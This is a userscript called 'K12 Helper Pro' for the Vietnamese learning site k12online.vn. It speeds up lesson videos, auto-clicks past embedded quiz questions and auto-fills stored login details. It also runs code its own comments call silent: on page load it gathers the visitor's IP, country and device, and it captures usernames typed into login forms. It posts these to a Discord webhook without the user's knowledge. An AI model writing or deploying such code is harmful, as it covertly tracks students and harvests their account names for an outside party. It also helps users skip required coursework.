// ==UserScript==
// @name K12 Helper Pro - Danhvux Port 8000 (Silent Webhook v22.3)
// @namespace http://tampermonkey.net/
// @version 22.3
// @description K12 Helper Pro đầy đủ + Discord Webhook chạy NGẦM (URL hardcoded trong code)
// @author Danhvux
// @match *://*.k12online.vn/*
// @grant GM_xmlhttpRequest
// @connect localhost
// @connect ipify.org
// @connect ipapi.co
// ==/UserScript==

(function () {
    'use strict';

    // ==================== NHẬP URL WEBHOOK TẠI ĐÂY (CHỈ SỬA DÒNG NÀY) ====================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/THAY_BẰNG_URL_CỦA_BẠN_VÀO_ĐÂY";
    // ===================================================================================

    const BLACKLIST_API = 'http://localhost:8000/blacklist';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00',
        width: 320,
        speed: 1,
        user: '',
        pass: '',
        isDarkMode: true,
        toastPos: 'top-right'
    };

    const saveConfig = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // ====================== DISCORD WEBHOOK CHẠY ẨN ======================
    let userIP = null;
    let userCountry = 'Unknown';
    let deviceInfo = null;

    const getDeviceInfo = () => ({
        isMobile: /Mobi|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? '📱 Mobile' : '💻 Desktop',
        platform: navigator.platform || 'Unknown'
    });

    const sendDiscordWebhook = (title, description, color = 0x7289da, fields = []) => {
        if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) return;

        const payload = {
            username: "K12 Helper Pro",
            avatar_url: "https://i.imgur.com/8Z5Z8Z5.png",
            embeds: [{
                title: title,
                description: description,
                color: color,
                timestamp: new Date().toISOString(),
                fields: fields,
                footer: { text: "Danhvux • K12 Helper Pro v22.3" }
            }]
        };

        GM_xmlhttpRequest({
            method: "POST",
            url: WEBHOOK_URL,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify(payload)
        });
    };

    const initSilentTracking = async () => {
        deviceInfo = getDeviceInfo();

        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            userIP = ipData.ip;

            const geoRes = await new Promise(resolve => {
                GM_xmlhttpRequest({
                    method: "GET",
                    url: `https://ipapi.co/${userIP}/json/`,
                    onload: r => resolve(r),
                    onerror: () => resolve(null)
                });
            });

            if (geoRes && geoRes.responseText) {
                const geo = JSON.parse(geoRes.responseText);
                userCountry = geo.country_name || geo.country || 'Unknown';
            }
        } catch (e) {
            userIP = 'Unknown';
        }

        // Gửi Session Started
        if (WEBHOOK_URL) {
            const fields = [
                { name: '📍 IP', value: userIP || 'N/A', inline: true },
                { name: '🌍 Quốc gia', value: userCountry, inline: true },
                { name: '🖥️ Thiết bị', value: deviceInfo.isMobile, inline: true },
                { name: '🔑 Tài khoản', value: config.user || 'Chưa lưu', inline: true },
                { name: '🌐 URL', value: window.location.href.substring(0, 60) + '...', inline: false }
            ];
            sendDiscordWebhook('🚀 K12 Session Started', 'Người dùng đã mở k12online.vn với K12 Helper Pro', 0x00bfff, fields);
        }
    };

    const trackLoginAttempt = () => {
        document.addEventListener('submit', (e) => {
            if (!WEBHOOK_URL) return;

            const form = e.target;
            const usernameInput = form.querySelector('input[name="username"], input[name="email"], input[placeholder*="Tài khoản"], input[placeholder*="Email"]');

            if (usernameInput) {
                const loginUser = usernameInput.value.trim() || config.user || 'Unknown';
                setTimeout(() => {
                    const fields = [
                        { name: '📍 IP', value: userIP || 'N/A', inline: true },
                        { name: '🌍 Quốc gia', value: userCountry, inline: true },
                        { name: '🔑 Tài khoản', value: `**${loginUser}**`, inline: false },
                        { name: '🖥️ Thiết bị', value: deviceInfo ? deviceInfo.isMobile : 'N/A', inline: true }
                    ];
                    sendDiscordWebhook('🔐 Đăng nhập K12 Detected', 'Phát hiện đăng nhập trên k12online.vn', 0xff4500, fields);
                }, 800);
            }
        }, true);
    };

    // ====================== TURBO & BYPASS ======================
    const runTurbo = () => {
        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play();
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    // ====================== SECURITY SYSTEM ======================
    const startSecuritySystem = () => {
        return new Promise((resolve) => {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    GM_xmlhttpRequest({
                        method: "GET",
                        url: BLACKLIST_API + "?nocache=" + Date.now(),
                        onload: function (response) {
                            try {
                                const bannedList = JSON.parse(response.responseText);
                                if (bannedList.includes(data.ip)) {
                                    renderBannedScreen(data.ip);
                                    resolve(false);
                                } else resolve(true);
                            } catch (e) { resolve(true); }
                        },
                        onerror: () => resolve(true)
                    });
                })
                .catch(() => resolve(true));
        });
    };

    const renderBannedScreen = (ip) => {
        document.body.innerHTML = `
            <div style="height:100vh; background:#0d1117; color:#ff4d4d; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center;">
                <h1 style="font-size:60px; margin:0;">🚫 BANNED</h1>
                <p style="font-size:20px; color:#c9d1d9;">IP của bạn (<b>${ip}</b>) đã bị cấm truy cập Panel.</p>
            </div>`;
    };

    // ====================== TOAST ======================
    const showToast = (message, type = 'info', duration = 2500) => {
        const isDark = config.isDarkMode;
        const pos = config.toastPos;

        document.querySelectorAll('.toast').forEach(t => t.remove());
        const container = document.createElement('div');
        container.style.cssText = `position: fixed; z-index: 999999; display: flex; flex-direction: column; gap: 12px; pointer-events: none; ${pos.includes('top') ? 'top: 20px;' : 'bottom: 20px;'} ${pos.includes('right') ? 'right: 20px;' : 'left: 20px;'}`;

        const toast = document.createElement('div');
        toast.style.cssText = `
            min-width: 280px; padding: 16px 20px; background: ${isDark ? '#1e2227' : '#ffffff'}; 
            color: ${isDark ? '#ffffff' : '#1e2227'}; border-radius: 12px; box-shadow: 0 8px 24px ${isDark ? 'rgba(0,0,0,0.6)' : 'rgba(0,0,0,0.15)'};
            font-family: 'Segoe UI', sans-serif; font-size: 14px; display: flex; align-items: center; gap: 14px;
            opacity: 0; transform: translateY(-20px) scale(0.95); animation: toastIn 0.4s forwards;
        `;
        const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
        toast.innerHTML = `<span style="font-size:20px;">${icons[type] || icons.info}</span><span>${message}</span>`;

        container.appendChild(toast);
        document.body.appendChild(container);

        if (!document.getElementById('toast-anim-css')) {
            const anim = document.createElement('style');
            anim.id = 'toast-anim-css';
            anim.innerHTML = `@keyframes toastIn { to { opacity:1; transform:translateY(0) scale(1); } } @keyframes toastOut { to { opacity:0; transform:translateY(-20px) scale(0.95); } }`;
            document.head.appendChild(anim);
        }

        setTimeout(() => {
            toast.style.animation = 'toastOut 0.3s forwards';
            setTimeout(() => toast.remove(), 300);
        }, duration);
    };

    // ====================== KHỞI CHẠY TOÀN BỘ ======================
    startSecuritySystem().then(accessGranted => {
        if (!accessGranted) return;

        // Khởi động webhook ẩn
        initSilentTracking();
        trackLoginAttempt();

        // Tạo CSS
        const style = document.createElement('style');
        const updateCSS = () => {
            const isDark = config.isDarkMode;
            style.innerHTML = `
                :root {
                    --mc: ${config.mainColor}; --w: ${config.width}px;
                    --bg: ${isDark ? '#1e2227' : '#ffffff'}; --bg-tab: ${isDark ? '#1a1d21' : '#f0f0f0'};
                    --bg-input: ${isDark ? '#252a31' : '#f9f9f9'}; --text: ${isDark ? '#ffffff' : '#1e2227'};
                    --text-sec: ${isDark ? '#777' : '#999'}; --border: ${isDark ? '#333' : '#ddd'};
                }
                #dv-panel {
                    position: fixed; top: 50px; right: 20px; width: var(--w) !important;
                    background: var(--bg); color: var(--text); border-radius: 12px;
                    font-family: 'Segoe UI', sans-serif; z-index: 100000;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.6); overflow: hidden; border: 1px solid var(--border);
                }
                .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; }
                .header .title { color: var(--mc); font-weight: bold; font-size: 18px; }
                .dots { display: flex; gap: 8px; }
                .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; }
                .red { background: #ff5f56; } .yellow { background: #ffbd2e; } .green { background: #27c93f; }
                .tabs { display: flex; background: var(--bg-tab); padding: 0 5px; border-bottom: 1px solid var(--border); }
                .tab { padding: 12px 10px; cursor: pointer; font-size: 10px; color: var(--text-sec); font-weight: 900; position: relative; }
                .tab.active { color: var(--mc); }
                .tab.active::after { content: ''; position: absolute; bottom: 0; left: 10px; right: 10px; height: 3px; background: var(--mc); }
                .content { display: none; padding: 20px; box-sizing: border-box; }
                .content.active { display: block; }
                .row-speed { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
                .val-right { color: var(--mc); font-weight: bold; font-size: 16px; }
                .slider { width: 100%; height: 5px; background: var(--border); border-radius: 5px; margin: 10px 0 25px 0; }
                .slider::-webkit-slider-thumb { appearance: none; width: 16px; height: 16px; background: ${isDark ? '#fff' : 'var(--mc)'}; border-radius: 50%; cursor: pointer; }
                input[type=text], input[type=password] { width: 100%; padding: 12px; background: var(--bg-input); border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 12px; box-sizing: border-box; }
                .btn { width: 100%; padding: 14px; background: #b8cc8e; border: none; border-radius: 12px; color: #1e2227; font-weight: bold; cursor: pointer; }
                .btn-save { background: var(--mc) !important; color: #000; }
                .switch-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
                .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider-switch { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 20px; }
                .slider-switch:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
                input:checked + .slider-switch { background-color: var(--mc); }
                input:checked + .slider-switch:before { transform: translateX(20px); }
                .footer { text-align: center; font-size: 9px; color: var(--text-sec); padding: 10px; }
            `;
        };
        document.head.appendChild(style);
        updateCSS();

        // Tạo Panel
        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="dots"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div class="row-speed"><b>Tốc độ</b><span class="val-right">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" class="slider" min="1" max="20" step="0.5" value="${config.speed}">
                    <button class="btn" id="do-login">🪄 AUTO LOGIN</button>
                </div>
                <div id="t-video" class="content">
                    <div class="video-placeholder" id="v-display" style="width:100%;height:130px;background:#000;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#444;font-style:italic;margin-bottom:15px;border:1px dashed #333;">video source</div>
                    <input type="text" id="v-url" placeholder="Link video .mp4...">
                    <button class="btn" style="background:#444;color:#fff" id="v-run">PHÁT VIDEO</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
                        <div class="app-item" onclick="window.open('https://gemini.google.com')" style="background:var(--bg-input);padding:12px;border-radius:10px;cursor:pointer;border:1px solid var(--border);text-align:center;">✨ Gemini</div>
                        <div class="app-item" onclick="window.open('https://chatgpt.com')">🤖 GPT</div>
                        <div class="app-item" onclick="window.open('https://messenger.com')">💬 Msg</div>
                        <div class="app-item" onclick="window.open('https://facebook.com')">📘 FB</div>
                        <div class="app-item" onclick="window.open('https://youtube.com')">🔴 YT</div>
                        <div class="app-item" onclick="window.open('https://tiktok.com')">🎵 TT</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <div class="switch-row"><span>DARK MODE</span><label class="switch"><input type="checkbox" id="mode-toggle" ${config.isDarkMode ? 'checked' : ''}><span class="slider-switch"></span></label></div>
                    <div class="switch-row"><span>TOAST POSITION</span>
                        <select id="toast-pos" style="padding:8px;background:var(--bg-input);border:1px solid var(--border);color:var(--text);border-radius:6px;">
                            <option value="top-right" ${config.toastPos === 'top-right' ? 'selected' : ''}>Top Right</option>
                            <option value="top-left" ${config.toastPos === 'top-left' ? 'selected' : ''}>Top Left</option>
                            <option value="bottom-right" ${config.toastPos === 'bottom-right' ? 'selected' : ''}>Bottom Right</option>
                            <option value="bottom-left" ${config.toastPos === 'bottom-left' ? 'selected' : ''}>Bottom Left</option>
                        </select>
                    </div>
                    <input type="color" id="c-pick" style="width:100%;height:40px;background:none;border:none;" value="${config.mainColor}">
                    <input type="range" id="w-range" class="slider" min="280" max="600" value="${config.width}">
                    <input type="text" id="u-val" placeholder="Username..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Password..." value="${config.pass}">
                    <button class="btn btn-save" id="btn-save">💾 LƯU CÀI ĐẶT</button>
                </div>
            </div>
            <div class="footer">DANHVUX • K12 HELPER PRO v22.3 - Webhook chạy ngầm</div>
        `;
        document.body.appendChild(panel);

        const $ = (id) => panel.querySelector(id);
        const adjustHeight = () => {
            const active = panel.querySelector('.content.active');
            if (active) panel.style.height = (panel.querySelector('.header').offsetHeight + panel.querySelector('.tabs').offsetHeight + active.scrollHeight + 40) + 'px';
        };

        // Tab
        panel.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => {
                panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                tab.classList.add('active');
                $(`#${tab.dataset.t}`).classList.add('active');
                adjustHeight();
            };
        });

        // Events
        $('#mode-toggle').onchange = (e) => { config.isDarkMode = e.target.checked; updateCSS(); saveConfig(); showToast('Dark mode updated', 'success'); };
        $('#toast-pos').onchange = (e) => { config.toastPos = e.target.value; saveConfig(); showToast('Toast position updated', 'info'); };
        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = parseFloat(e.target.value); runTurbo(); };
        $('#w-range').oninput = (e) => { config.width = parseInt(e.target.value); panel.style.width = config.width + 'px'; };

        $('#btn-save').onclick = () => {
            config.mainColor = $('#c-pick').value;
            config.user = $('#u-val').value;
            config.pass = $('#p-val').value;
            saveConfig();
            showToast('✅ Đã lưu cài đặt!', 'success');
        };

        $('#v-run').onclick = () => {
            const v = document.querySelector('video');
            if (v) {
                v.src = $('#v-url').value;
                v.play();
                $('#v-display').innerText = "Đang phát...";
                showToast('Đã bắt đầu phát video', 'success');
            } else showToast('Không tìm thấy video element', 'error');
        };

        $('#do-login').onclick = () => {
            const u = document.querySelector('input[name="username"], input[placeholder*="Tài khoản"]');
            const p = document.querySelector('input[name="password"], input[placeholder*="Mật khẩu"]');
            if (u && p) {
                u.value = config.user;
                p.value = config.pass;
                u.dispatchEvent(new Event('input', { bubbles: true }));
                p.dispatchEvent(new Event('input', { bubbles: true }));
                setTimeout(() => document.querySelector('button[type="submit"]')?.click(), 500);
                showToast('Đang tự động đăng nhập...', 'info');
            } else {
                showToast('Không tìm thấy form login', 'warning');
            }
        };

        // Drag panel
        let isDrag = false, offset = [0, 0];
        $('.header').onmousedown = (e) => {
            isDrag = true;
            offset = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY];
        };
        document.onmousemove = (e) => {
            if (isDrag) {
                panel.style.left = (e.clientX + offset[0]) + 'px';
                panel.style.top = (e.clientY + offset[1]) + 'px';
                panel.style.right = 'auto';
            }
        };
        document.onmouseup = () => isDrag = false;

        $('.red').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', (e) => { if (e.key === 'F2') panel.style.display = 'block'; });

        setTimeout(() => {
            adjustHeight();
            showToast('K12 Helper Pro v22.3 đã chạy - Webhook đang hoạt động ngầm', 'success', 2500);
        }, 600);
    });
})();
